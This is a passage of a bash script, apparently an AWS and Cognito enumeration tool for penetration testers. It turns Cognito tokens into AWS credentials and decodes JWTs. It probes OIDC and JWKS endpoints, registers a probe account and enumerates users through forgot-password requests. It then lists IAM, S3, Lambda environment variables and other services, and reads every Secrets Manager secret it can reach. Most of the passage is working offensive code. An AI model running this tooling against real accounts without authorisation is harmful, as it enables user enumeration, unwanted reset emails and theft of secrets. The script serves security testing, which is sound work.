    echo -n "Getting identity ID (authenticated)... "
    local id_result
    id_result=$(aws cognito-identity get-id \
        --identity-pool-id "$COGNITO_IDENTITY_POOL_ID" \
        --logins "{\"${provider}\": \"${id_token}\"}" \
        --region "$AWS_REGION" 2>&1)

    if echo "$id_result" | grep -q "IdentityId"; then
        local identity_id
        identity_id=$(echo "$id_result" | jq -r '.IdentityId')
        print_success "Got authenticated Identity ID: $identity_id"

        echo -n "Getting AWS credentials for authenticated identity... "
        local creds_result
        creds_result=$(aws cognito-identity get-credentials-for-identity \
            --identity-id "$identity_id" \
            --logins "{\"${provider}\": \"${id_token}\"}" \
            --region "$AWS_REGION" 2>&1)

        if echo "$creds_result" | grep -q "Credentials"; then
            print_success "Got temporary AWS credentials!"
            print_finding "Authenticated Cognito credentials obtained!"

            echo "$creds_result" > "$OUTPUT_DIR/cognito_authenticated_credentials.json"

            COGNITO_ACCESS_KEY=$(echo "$creds_result" | jq -r '.Credentials.AccessKeyId')
            COGNITO_SECRET_KEY=$(echo "$creds_result" | jq -r '.Credentials.SecretKey')
            COGNITO_SESSION_TOKEN=$(echo "$creds_result" | jq -r '.Credentials.SessionToken')
            local expiration
            expiration=$(echo "$creds_result" | jq -r '.Credentials.Expiration')

            print_info "Access Key: $COGNITO_ACCESS_KEY"
            print_info "Expiration: $expiration"

            return 0
        else
            print_error "Failed to get credentials for authenticated identity: $creds_result"
            return 1
        fi
    else
        print_error "Failed to get authenticated identity: $id_result"
        return 1
    fi
}

enumerate_with_bearer_token() {
    print_section "BEARER TOKEN ENUMERATION"

    print_info "Enumerating access using OAuth2 Bearer token"
    print_info "Token length: ${#OAUTH2_ACCESS_TOKEN} chars"

    # --- Decode JWT claims ---
    print_section "JWT TOKEN ANALYSIS"
    local jwt_payload
    jwt_payload=$(echo "$OAUTH2_ACCESS_TOKEN" | cut -d'.' -f2)

    # Fix base64 padding
    local padded="$jwt_payload"
    local mod=$((${#padded} % 4))
    if [ "$mod" -eq 2 ]; then padded="${padded}==";
    elif [ "$mod" -eq 3 ]; then padded="${padded}="; fi

    local decoded_claims
    decoded_claims=$(echo "$padded" | base64 -d 2>/dev/null)

    if [ -n "$decoded_claims" ] && echo "$decoded_claims" | jq . >/dev/null 2>&1; then
        print_success "JWT decoded successfully"
        echo "$decoded_claims" | jq . > "$OUTPUT_DIR/jwt_claims.json"
        echo "$decoded_claims" | jq .

        local issuer client_id token_use scopes sub exp
        issuer=$(echo "$decoded_claims" | jq -r '.iss // empty')
        client_id=$(echo "$decoded_claims" | jq -r '.client_id // empty')
        token_use=$(echo "$decoded_claims" | jq -r '.token_use // empty')
        scopes=$(echo "$decoded_claims" | jq -r '.scope // empty')
        sub=$(echo "$decoded_claims" | jq -r '.sub // empty')
        exp=$(echo "$decoded_claims" | jq -r '.exp // empty')

        [ -n "$issuer" ] && print_info "Issuer: $issuer"
        [ -n "$client_id" ] && print_info "Client ID: $client_id"
        [ -n "$token_use" ] && print_info "Token use: $token_use"
        [ -n "$sub" ] && print_info "Subject: $sub"
        if [ -n "$scopes" ]; then
            print_finding "Scopes: $scopes"
            echo "$scopes" > "$OUTPUT_DIR/token_scopes.txt"
        fi
        if [ -n "$exp" ]; then
            local exp_date
            exp_date=$(date -r "$exp" 2>/dev/null || date -d "@$exp" 2>/dev/null || echo "unknown")
            print_info "Expires: $exp_date"
        fi

        # Extract User Pool region and ID from issuer
        if [[ "$issuer" =~ cognito-idp\.([^.]+)\.amazonaws\.com/(.+) ]]; then
            discovered_pool_region="${BASH_REMATCH[1]}"
            discovered_pool_id="${BASH_REMATCH[2]}"
            discovered_issuer="$issuer"
            print_finding "User Pool Region: $discovered_pool_region"
            print_finding "User Pool ID: $discovered_pool_id"
        fi
    else
        print_warning "Could not decode JWT payload (may be an opaque token)"
    fi

    # --- Derive base URL from token URL for API probing ---
    local base_domain=""
    if [ -n "$OAUTH2_TOKEN_URL" ]; then
        base_domain=$(echo "$OAUTH2_TOKEN_URL" | sed 's|/oauth2/token||' | sed 's|/$||')
    fi

    # --- Probe Cognito userInfo endpoint ---
    print_section "COGNITO USERINFO PROBE"

    local userinfo_url=""
    if [ -n "$base_domain" ]; then
        userinfo_url="${base_domain}/oauth2/userInfo"
    fi

    if [ -n "$userinfo_url" ]; then
        print_info "Testing: $userinfo_url"
        echo -n "Probing userInfo... "
        local userinfo_result
        userinfo_result=$(curl -s -w "\n%{http_code}" \
            -H "Authorization: Bearer ${OAUTH2_ACCESS_TOKEN}" \
            "$userinfo_url" 2>&1)

        local userinfo_body userinfo_code
        userinfo_code=$(echo "$userinfo_result" | tail -1)
        userinfo_body=$(echo "$userinfo_result" | sed '$d')

        if [ "$userinfo_code" = "200" ]; then
            print_success "userInfo accessible! (HTTP $userinfo_code)"
            print_finding "User info retrieved:"
            echo "$userinfo_body" | jq . 2>/dev/null || echo "$userinfo_body"
            echo "$userinfo_body" > "$OUTPUT_DIR/cognito_userinfo.json"
        else
            print_info "userInfo returned HTTP $userinfo_code (expected for client_credentials tokens)"
        fi
    fi

    # --- Probe well-known OIDC configuration ---
    print_section "OIDC DISCOVERY"

    if [ -n "$base_domain" ]; then
        local wellknown_url="${base_domain}/.well-known/openid-configuration"
        print_info "Testing: $wellknown_url"
        echo -n "Fetching OIDC config... "
        local oidc_result
        oidc_result=$(curl -s -w "\n%{http_code}" "$wellknown_url" 2>&1)

        local oidc_body oidc_code
        oidc_code=$(echo "$oidc_result" | tail -1)
        oidc_body=$(echo "$oidc_result" | sed '$d')

        if [ "$oidc_code" = "200" ]; then
            print_success "OIDC discovery document found!"
            echo "$oidc_body" | jq . 2>/dev/null || echo "$oidc_body"
            echo "$oidc_body" > "$OUTPUT_DIR/oidc_configuration.json"

            local supported_scopes
            supported_scopes=$(echo "$oidc_body" | jq -r '.scopes_supported[]?' 2>/dev/null | tr '\n' ', ')
            [ -n "$supported_scopes" ] && print_finding "Supported scopes: $supported_scopes"

            local token_endpoint_from_oidc
            token_endpoint_from_oidc=$(echo "$oidc_body" | jq -r '.token_endpoint // empty' 2>/dev/null)
            [ -n "$token_endpoint_from_oidc" ] && print_info "Token endpoint: $token_endpoint_from_oidc"

            local auth_endpoint
            auth_endpoint=$(echo "$oidc_body" | jq -r '.authorization_endpoint // empty' 2>/dev/null)
            [ -n "$auth_endpoint" ] && print_info "Authorization endpoint: $auth_endpoint"
        else
            print_info "No OIDC config at $wellknown_url (HTTP $oidc_code)"
        fi
    fi

    # --- Cognito User Pool Misconfiguration Probing ---
    if [ -n "$discovered_pool_id" ]; then
        print_section "COGNITO USER POOL MISCONFIGURATION PROBING"

        local probe_region="${discovered_pool_region:-$AWS_REGION}"
        local probe_client_id="${COGNITO_CLIENT_ID}"

        print_info "User Pool ID: $discovered_pool_id"
        print_info "Region: $probe_region"
        print_info "Client ID: $probe_client_id"

        # --- JWKS signing keys ---
        if [ -n "$discovered_issuer" ]; then
            local jwks_url="${discovered_issuer}/.well-known/jwks.json"
            print_info "Fetching JWKS: $jwks_url"
            echo -n "Getting signing keys... "
            local jwks_result
            jwks_result=$(curl -s -w "\n%{http_code}" "$jwks_url" 2>&1)

            local jwks_body jwks_code
            jwks_code=$(echo "$jwks_result" | tail -1)
            jwks_body=$(echo "$jwks_result" | sed '$d')

            if [ "$jwks_code" = "200" ]; then
                print_success "JWKS retrieved!"
                echo "$jwks_body" | jq . 2>/dev/null || echo "$jwks_body"
                echo "$jwks_body" > "$OUTPUT_DIR/cognito_jwks.json"

                local key_count
                key_count=$(echo "$jwks_body" | jq '.keys | length' 2>/dev/null)
                print_info "Signing keys found: $key_count"

                local key_types
                key_types=$(echo "$jwks_body" | jq -r '.keys[].kty' 2>/dev/null | sort -u | tr '\n' ', ')
                [ -n "$key_types" ] && print_info "Key types: $key_types"
            else
                print_info "JWKS not accessible (HTTP $jwks_code)"
            fi
        fi

        # --- Test self-registration (sign-up) ---
        print_info "Testing if self-registration is enabled..."
        echo -n "Probing sign-up... "

        local signup_result
        signup_result=$(aws cognito-idp sign-up \
            --client-id "$probe_client_id" \
            --username "awshunter-probe-test@example.com" \
            --password 'AWSHunter!Probe1' \
            --region "$probe_region" \
            --no-sign-request 2>&1)

        if echo "$signup_result" | grep -qi "UserSub\|CodeDeliveryDetails\|UsernameExistsException"; then
            if echo "$signup_result" | grep -qi "UsernameExistsException"; then
                print_finding "Self-registration is ENABLED (username already exists response)"
                print_finding "User enumeration possible via sign-up"
            else
                print_finding "Self-registration is ENABLED and sign-up succeeded!"
                print_warning "A test account may have been created - notify client"
            fi
            echo "$signup_result" > "$OUTPUT_DIR/cognito_signup_probe.json"
        elif echo "$signup_result" | grep -qi "NotAuthorizedException.*client secret"; then
            print_info "Sign-up requires SECRET_HASH (client has a secret configured)"

            # Retry with SECRET_HASH
            if [ -n "$COGNITO_CLIENT_SECRET" ]; then
                local signup_hash
                signup_hash=$(printf '%s' "awshunter-probe-test@example.com${probe_client_id}" \
                    | openssl dgst -sha256 -hmac "$COGNITO_CLIENT_SECRET" -binary | base64)

                signup_result=$(aws cognito-idp sign-up \
                    --client-id "$probe_client_id" \
                    --username "awshunter-probe-test@example.com" \
                    --password 'AWSHunter!Probe1' \
                    --secret-hash "$signup_hash" \
                    --region "$probe_region" \
                    --no-sign-request 2>&1)

                if echo "$signup_result" | grep -qi "UserSub\|CodeDeliveryDetails\|UsernameExistsException"; then
                    if echo "$signup_result" | grep -qi "UsernameExistsException"; then
                        print_finding "Self-registration is ENABLED (with secret hash)"
                        print_finding "User enumeration possible via sign-up"
                    else
                        print_finding "Self-registration is ENABLED (with secret hash) and sign-up succeeded!"
                        print_warning "A test account may have been created - notify client"
                    fi
                    echo "$signup_result" > "$OUTPUT_DIR/cognito_signup_probe.json"
                elif echo "$signup_result" | grep -qi "InvalidPasswordException"; then
                    print_finding "Self-registration is ENABLED (password policy rejected probe password)"
                    echo "$signup_result" > "$OUTPUT_DIR/cognito_signup_probe.json"
                else
                    print_info "Sign-up not available: $(echo "$signup_result" | head -1)"
                fi
            fi
        elif echo "$signup_result" | grep -qi "InvalidPasswordException"; then
            print_finding "Self-registration is ENABLED (password policy rejected probe password)"
            echo "$signup_result" > "$OUTPUT_DIR/cognito_signup_probe.json"
        else
            print_info "Sign-up response: $(echo "$signup_result" | head -1)"
        fi

        # --- Test user enumeration via forgot-password ---
        print_info "Testing forgot-password for user enumeration..."
        echo -n "Probing forgot-password... "

        local forgot_result
        local test_users=("admin" "admin@example.com" "test" "developer" "user")

        for test_user in "${test_users[@]}"; do
            local forgot_cmd_result

            if [ -n "$COGNITO_CLIENT_SECRET" ]; then
                local forgot_hash
                forgot_hash=$(printf '%s' "${test_user}${probe_client_id}" \
                    | openssl dgst -sha256 -hmac "$COGNITO_CLIENT_SECRET" -binary | base64)

                forgot_cmd_result=$(aws cognito-idp forgot-password \
                    --client-id "$probe_client_id" \
                    --username "$test_user" \
                    --secret-hash "$forgot_hash" \
                    --region "$probe_region" \
                    --no-sign-request 2>&1)
            else
                forgot_cmd_result=$(aws cognito-idp forgot-password \
                    --client-id "$probe_client_id" \
                    --username "$test_user" \
                    --region "$probe_region" \
                    --no-sign-request 2>&1)
            fi

            if echo "$forgot_cmd_result" | grep -qi "CodeDeliveryDetails"; then
                print_finding "User EXISTS: '$test_user' (forgot-password sent reset code)"
                echo "CONFIRMED_USER: $test_user" >> "$OUTPUT_DIR/cognito_user_enum.txt"
                echo "$forgot_cmd_result" >> "$OUTPUT_DIR/cognito_forgot_password_probe.json"
            elif echo "$forgot_cmd_result" | grep -qi "UserNotFoundException"; then
                echo -n "."
            elif echo "$forgot_cmd_result" | grep -qi "LimitExceededException"; then
                print_warning "Rate limited - stopping user enumeration"
                break
            elif echo "$forgot_cmd_result" | grep -qi "NotAuthorizedException"; then
                print_info "forgot-password not allowed for this client"
                break
            elif echo "$forgot_cmd_result" | grep -qi "InvalidParameterException"; then
                print_info "forgot-password requires verified contact info"
                break
            else
                echo -n "."
            fi
        done
        echo ""

        if [ -f "$OUTPUT_DIR/cognito_user_enum.txt" ]; then
            local enum_count
            enum_count=$(wc -l < "$OUTPUT_DIR/cognito_user_enum.txt" | tr -d ' ')
            print_finding "Enumerated $enum_count valid user(s)"
            print_info "Results saved to $OUTPUT_DIR/cognito_user_enum.txt"
        else
            print_info "No users enumerated via forgot-password"
        fi

        # --- Test describe-user-pool-client (requires IAM, but worth trying) ---
        print_info "Attempting to describe user pool client..."
        echo -n "Probing describe-user-pool-client... "
        local describe_client_result
        describe_client_result=$(aws cognito-idp describe-user-pool-client \
            --user-pool-id "$discovered_pool_id" \
            --client-id "$probe_client_id" \
            --region "$probe_region" 2>&1)

        if echo "$describe_client_result" | grep -qi "ClientId"; then
            print_finding "User Pool client details accessible!"
            echo "$describe_client_result" | jq . 2>/dev/null || echo "$describe_client_result"
            echo "$describe_client_result" > "$OUTPUT_DIR/cognito_client_details.json"

            local callback_urls
            callback_urls=$(echo "$describe_client_result" | jq -r '.UserPoolClient.CallbackURLs[]?' 2>/dev/null)
            if [ -n "$callback_urls" ]; then
                print_finding "Callback URLs found:"
                echo "$callback_urls" | while read -r url; do echo "  - $url"; done
                echo "$callback_urls" > "$OUTPUT_DIR/cognito_callback_urls.txt"
            fi

            local allowed_flows
            allowed_flows=$(echo "$describe_client_result" | jq -r '.UserPoolClient.ExplicitAuthFlows[]?' 2>/dev/null)
            if [ -n "$allowed_flows" ]; then
                print_finding "Allowed auth flows:"
                echo "$allowed_flows" | while read -r flow; do echo "  - $flow"; done
            fi

            local allowed_scopes
            allowed_scopes=$(echo "$describe_client_result" | jq -r '.UserPoolClient.AllowedOAuthScopes[]?' 2>/dev/null)
            if [ -n "$allowed_scopes" ]; then
                print_finding "Allowed OAuth scopes:"
                echo "$allowed_scopes" | while read -r scope; do echo "  - $scope"; done
            fi
        else
            print_info "describe-user-pool-client not accessible (expected without IAM creds)"
        fi

        # --- Try listing user pool clients ---
        print_info "Attempting to list user pool clients..."
        echo -n "Probing list-user-pool-clients... "
        local list_clients_result
        list_clients_result=$(aws cognito-idp list-user-pool-clients \
            --user-pool-id "$discovered_pool_id" \
            --region "$probe_region" 2>&1)

        if echo "$list_clients_result" | grep -qi "UserPoolClients"; then
            print_finding "User Pool clients enumerated!"
            echo "$list_clients_result" | jq . 2>/dev/null || echo "$list_clients_result"
            echo "$list_clients_result" > "$OUTPUT_DIR/cognito_pool_clients.json"

            local client_count
            client_count=$(echo "$list_clients_result" | jq '.UserPoolClients | length' 2>/dev/null)
            print_finding "Found $client_count app client(s) in the User Pool"
        else
            print_info "list-user-pool-clients not accessible (expected without IAM creds)"
        fi
    fi

    # --- Probe API Gateway endpoints ---
    print_section "API GATEWAY ENDPOINT PROBING"

    local api_base_urls=()

    # Derive potential API Gateway base URLs from the token URL domain
    if [ -n "$OAUTH2_TOKEN_URL" ]; then
        local token_domain
        token_domain=$(echo "$OAUTH2_TOKEN_URL" | sed 's|https://||' | cut -d'/' -f1 | cut -d'.' -f1)
        local token_region
        token_region=$(echo "$OAUTH2_TOKEN_URL" | sed -n 's|.*\.auth\.\([^.]*\)\.amazoncognito.*|\1|p')

        if [ -n "$token_region" ]; then
            print_info "Detected region from token URL: $token_region"
            print_info "Scanning for API Gateway endpoints in $token_region"
        fi
    fi

    # Common API Gateway stage paths to probe
    local stage_paths=("prod" "dev" "staging" "test" "api" "v1" "v2" "default" "stage")

    # If user provided --api-url or we can find API Gateway URLs, probe them
    if [ ${#api_base_urls[@]} -eq 0 ]; then
        print_info "No API Gateway base URLs discovered automatically"
        print_info "To probe a specific API, re-run with environment variable:"
        print_info "  API_BASE_URL=https://xxxxx.execute-api.region.amazonaws.com ./awsHunter.sh ..."
    fi

    # Check for API_BASE_URL env var
    if [ -n "${API_BASE_URL:-}" ]; then
        api_base_urls+=("$API_BASE_URL")
    fi

    local api_findings=0
    for api_url in "${api_base_urls[@]}"; do
        local clean_url
        clean_url=$(echo "$api_url" | sed 's|/$||')
        print_info "Probing API: $clean_url"

        for stage in "${stage_paths[@]}"; do
            local probe_url="${clean_url}/${stage}"
            echo -n "  Testing ${stage}... "
            local probe_result
            probe_result=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "Authorization: Bearer ${OAUTH2_ACCESS_TOKEN}" \
                -H "Content-Type: application/json" \
                "$probe_url" 2>&1)

            if [ "$probe_result" = "200" ] || [ "$probe_result" = "201" ] || [ "$probe_result" = "403" ]; then
                if [ "$probe_result" = "403" ]; then
                    print_warning "${probe_url} -> HTTP $probe_result (exists but forbidden)"
                else
                    print_finding "${probe_url} -> HTTP $probe_result (ACCESSIBLE)"
                fi
                ((api_findings++))

                # Fetch full response for accessible endpoints
                if [ "$probe_result" != "403" ]; then
                    local full_response
                    full_response=$(curl -s \
                        -H "Authorization: Bearer ${OAUTH2_ACCESS_TOKEN}" \
                        -H "Content-Type: application/json" \
                        "$probe_url" 2>&1)
                    local safe_stage
                    safe_stage=$(echo "$stage" | tr '/' '_')
                    echo "$full_response" > "$OUTPUT_DIR/api_${safe_stage}_response.json"
                fi
            elif [ "$probe_result" = "401" ]; then
                echo "HTTP $probe_result (unauthorized)"
            elif [ "$probe_result" = "404" ]; then
                echo "HTTP $probe_result (not found)"
            else
                echo "HTTP $probe_result"
            fi
        done
    done

    # --- Summary ---
    print_section "BEARER TOKEN ENUMERATION SUMMARY"

    echo ""
    print_info "Token file: $OUTPUT_DIR/cognito_oauth2_token.json"
    [ -f "$OUTPUT_DIR/jwt_claims.json" ] && print_info "JWT claims: $OUTPUT_DIR/jwt_claims.json"
    [ -f "$OUTPUT_DIR/token_scopes.txt" ] && print_info "Scopes: $OUTPUT_DIR/token_scopes.txt"
    [ -f "$OUTPUT_DIR/cognito_userinfo.json" ] && print_info "User info: $OUTPUT_DIR/cognito_userinfo.json"
    [ -f "$OUTPUT_DIR/oidc_configuration.json" ] && print_info "OIDC config: $OUTPUT_DIR/oidc_configuration.json"
    [ -f "$OUTPUT_DIR/cognito_jwks.json" ] && print_info "JWKS keys: $OUTPUT_DIR/cognito_jwks.json"
    [ -f "$OUTPUT_DIR/cognito_user_enum.txt" ] && print_info "Enumerated users: $OUTPUT_DIR/cognito_user_enum.txt"
    [ -f "$OUTPUT_DIR/cognito_signup_probe.json" ] && print_info "Sign-up probe: $OUTPUT_DIR/cognito_signup_probe.json"
    [ -f "$OUTPUT_DIR/cognito_client_details.json" ] && print_info "Client details: $OUTPUT_DIR/cognito_client_details.json"
    [ -f "$OUTPUT_DIR/cognito_pool_clients.json" ] && print_info "Pool clients: $OUTPUT_DIR/cognito_pool_clients.json"

    echo ""
    print_info "To use this token manually:"
    echo "  export ACCESS_TOKEN='${OAUTH2_ACCESS_TOKEN:0:20}...'"
    echo "  curl -H \"Authorization: Bearer \$ACCESS_TOKEN\" https://your-api-endpoint/"
    echo ""
    print_info "To probe a specific API Gateway endpoint:"
    echo "  API_BASE_URL=https://xxxxx.execute-api.region.amazonaws.com \\"
    echo "    ./awsHunter.sh --client-id ... --client-secret ... --token-url ..."

    if [ "$api_findings" -gt 0 ]; then
        print_finding "Found $api_findings accessible/existing API endpoints"
    fi
}

setup_credentials() {
    print_section "SETTING UP AWS CREDENTIALS"
    
    # Priority: Direct credentials > Decoded credentials > Cognito credentials
    if [ -n "$DIRECT_ACCESS_KEY" ] && [ -n "$DIRECT_SECRET_KEY" ]; then
        print_info "Using directly provided credentials"
        export AWS_ACCESS_KEY_ID="$DIRECT_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$DIRECT_SECRET_KEY"
        [ -n "$DIRECT_SESSION_TOKEN" ] && export AWS_SESSION_TOKEN="$DIRECT_SESSION_TOKEN"
    elif [ -n "$DECODED_ACCESS_KEY" ] && [ -n "$DECODED_SECRET_KEY" ]; then
        print_info "Using decoded credentials (permanent keys)"
        export AWS_ACCESS_KEY_ID="$DECODED_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$DECODED_SECRET_KEY"
        unset AWS_SESSION_TOKEN
    elif [ -n "$COGNITO_ACCESS_KEY" ]; then
        if [ -n "$COGNITO_CLIENT_ID" ]; then
            print_info "Using Cognito authenticated credentials (temporary)"
        else
            print_info "Using Cognito unauthenticated credentials (temporary)"
        fi
        export AWS_ACCESS_KEY_ID="$COGNITO_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$COGNITO_SECRET_KEY"
        export AWS_SESSION_TOKEN="$COGNITO_SESSION_TOKEN"
    else
        print_error "No credentials available!"
        return 1
    fi
    
    export AWS_DEFAULT_REGION="$AWS_REGION"
    
    # Verify identity
    echo -n "Verifying identity... "
    IDENTITY=$(aws sts get-caller-identity 2>&1)
    
    if echo "$IDENTITY" | grep -q "Account"; then
        print_success "Identity verified!"
        echo "$IDENTITY" | jq .
        echo "$IDENTITY" > "$OUTPUT_DIR/caller_identity.json"
        
        # Extract key info
        ACCOUNT_ID=$(echo "$IDENTITY" | jq -r '.Account')
        ARN=$(echo "$IDENTITY" | jq -r '.Arn')
        
        print_info "Account ID: $ACCOUNT_ID"
        print_info "ARN: $ARN"
        
        # Check if permanent or temporary credentials
        if [[ "$AWS_ACCESS_KEY_ID" == AKIA* ]]; then
            print_finding "These are PERMANENT credentials (AKIA prefix)!"
        elif [[ "$AWS_ACCESS_KEY_ID" == ASIA* ]]; then
            print_info "These are temporary credentials (ASIA prefix)"
        fi
        
        return 0
    else
        print_error "Failed to verify identity: $IDENTITY"
        return 1
    fi
}

enumerate_services() {
    print_section "ENUMERATING AWS SERVICE ACCESS"
    
    local findings=0
    local tested_count=0
    local skipped_count=0
    
    # Show selected services info
    if [ -n "$SERVICES_TO_TEST" ]; then
        print_info "Testing only selected services: $SERVICES_TO_TEST"
    else
        print_info "Testing all services (use --service to test specific services)"
    fi
    
    # Initialize regions for multi-region testing
    if [ "$MULTI_REGION" = true ] && [ ${#ALL_REGIONS[@]} -eq 0 ]; then
        get_all_regions
    fi
    
    #===========================================================================
    # GLOBAL SERVICES (Single query - not region-specific)
    #===========================================================================
    print_section "TESTING GLOBAL SERVICES"
    
    # S3 (bucket listing is global)
    if should_test_service "s3"; then
        echo ""
        if test_service "S3 (List Buckets)" "aws s3 ls" "s3_buckets.txt"; then
            bucket_count=$(wc -l < "$OUTPUT_DIR/s3_buckets.txt")
            print_finding "Can list $bucket_count S3 buckets!"
            ((findings++))
        fi
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # IAM (Global) - Users
    if should_test_service "iam-users"; then
        echo ""
        test_service "IAM (List Users)" "aws iam list-users" "iam_users.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # IAM (Global) - Roles
    if should_test_service "iam-roles"; then
        echo ""
        test_service "IAM (List Roles)" "aws iam list-roles" "iam_roles.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Route53 (Global)
    if should_test_service "route53"; then
        echo ""
        test_service "Route53 (List Hosted Zones)" "aws route53 list-hosted-zones" "route53_zones.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CloudFront (Global)
    if should_test_service "cloudfront"; then
        echo ""
        test_service "CloudFront (List Distributions)" "aws cloudfront list-distributions" "cloudfront_distributions.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Organizations (Global)
    if should_test_service "organizations"; then
        echo ""
        test_service "Organizations (Describe Organization)" "aws organizations describe-organization" "organizations.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # REGIONAL SERVICES
    #===========================================================================
    print_section "TESTING REGIONAL SERVICES"
    
    if [ "$MULTI_REGION" = true ]; then
        print_info "Testing across ${#ALL_REGIONS[@]} regions..."
    else
        print_info "Testing single region: $AWS_REGION (use -m for multi-region)"
    fi
    
    # DynamoDB
    if should_test_service "dynamodb"; then
        echo ""
        if test_service_all_regions "DynamoDB (List Tables)" "aws dynamodb list-tables --region {REGION}" "dynamodb_tables.json"; then
            ((findings++)) || true
        fi
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Lambda
    if should_test_service "lambda"; then
        echo ""
        if test_service_all_regions "Lambda (List Functions)" "aws lambda list-functions --region {REGION}" "lambda_functions.json"; then
            print_warning "Lambda environment variables may contain secrets!"
            ((findings++)) || true
            
            # Extract environment variables from all region files
            print_info "Extracting Lambda environment variables..."
            for f in "$OUTPUT_DIR"/lambda_functions*.json; do
                [ -f "$f" ] && jq '.Functions[] | {FunctionName, Environment}' "$f" 2>/dev/null >> "$OUTPUT_DIR/lambda_env_vars.json" || true
            done
        fi
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Secrets Manager
    if should_test_service "secretsmanager"; then
        echo ""
        if test_service_all_regions "Secrets Manager (List Secrets)" "aws secretsmanager list-secrets --region {REGION}" "secrets_list.json"; then
            ((findings++)) || true
            
            # Try to read secrets
            print_info "Attempting to read secret values..."
            for secrets_file in "$OUTPUT_DIR"/secrets_list*.json; do
                [ -f "$secrets_file" ] || continue
                region=$(echo "$secrets_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
                [ -z "$region" ] && region="$AWS_REGION"
                
                for secret_name in $(jq -r '.SecretList[].Name // empty' "$secrets_file" 2>/dev/null); do
                    [ -z "$secret_name" ] && continue
                    echo -n "  Reading $secret_name ($region)... "
                    if secret_value=$(aws secretsmanager get-secret-value --secret-id "$secret_name" --region "$region" 2>&1); then
                        echo "$secret_value" > "$OUTPUT_DIR/secret_${region}_${secret_name//\//_}.json"
                        print_success "Retrieved!"
                    else
                        print_error "Access denied"
                    fi
                done
            done
        fi
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # EC2
    if should_test_service "ec2"; then
        echo ""
        test_service_all_regions "EC2 (Describe Instances)" "aws ec2 describe-instances --region {REGION}" "ec2_instances.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # RDS
    if should_test_service "rds"; then
        echo ""
        test_service_all_regions "RDS (Describe DB Instances)" "aws rds describe-db-instances --region {REGION}" "rds_instances.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SSM Parameter Store
    if should_test_service "ssm"; then
        echo ""
        test_service_all_regions "SSM (Describe Parameters)" "aws ssm describe-parameters --region {REGION}" "ssm_parameters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CloudWatch Logs
    if should_test_service "cloudwatch-logs"; then
        echo ""
        test_service_all_regions "CloudWatch Logs (Describe Log Groups)" "aws logs describe-log-groups --region {REGION}" "cloudwatch_logs.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SQS
    if should_test_service "sqs"; then
        echo ""
        test_service_all_regions "SQS (List Queues)" "aws sqs list-queues --region {REGION}" "sqs_queues.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SNS
    if should_test_service "sns"; then
        echo ""
        test_service_all_regions "SNS (List Topics)" "aws sns list-topics --region {REGION}" "sns_topics.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Cognito User Pools
    if should_test_service "cognito-pools"; then
        echo ""
        test_service_all_regions "Cognito (List User Pools)" "aws cognito-idp list-user-pools --max-results 60 --region {REGION}" "cognito_user_pools.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # API Gateway
    if should_test_service "apigateway"; then
        echo ""
        test_service_all_regions "API Gateway (Get REST APIs)" "aws apigateway get-rest-apis --region {REGION}" "api_gateway.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # KMS
    if should_test_service "kms"; then
        echo ""
        test_service_all_regions "KMS (List Keys)" "aws kms list-keys --region {REGION}" "kms_keys.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Kinesis
    if should_test_service "kinesis"; then
        echo ""
        test_service_all_regions "Kinesis (List Streams)" "aws kinesis list-streams --region {REGION}" "kinesis_streams.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # ECS
    if should_test_service "ecs"; then
        echo ""
        test_service_all_regions "ECS (List Clusters)" "aws ecs list-clusters --region {REGION}" "ecs_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # ECR
    if should_test_service "ecr"; then
        echo ""
        test_service_all_regions "ECR (Describe Repositories)" "aws ecr describe-repositories --region {REGION}" "ecr_repos.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Glue
    if should_test_service "glue"; then
        echo ""
        test_service_all_regions "Glue (Get Databases)" "aws glue get-databases --region {REGION}" "glue_databases.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Athena
    if should_test_service "athena"; then
        echo ""
        test_service_all_regions "Athena (List Work Groups)" "aws athena list-work-groups --region {REGION}" "athena_workgroups.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # Additional High-Value Services
    #===========================================================================
    
    print_section "TESTING ADDITIONAL REGIONAL SERVICES"
    
    # CloudFormation - Often contains sensitive parameters
    if should_test_service "cloudformation"; then
        echo ""
        test_service_all_regions "CloudFormation (List Stacks)" "aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE --region {REGION}" "cloudformation_stacks.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # ACM - SSL Certificates (Regional)
    if should_test_service "acm"; then
        echo ""
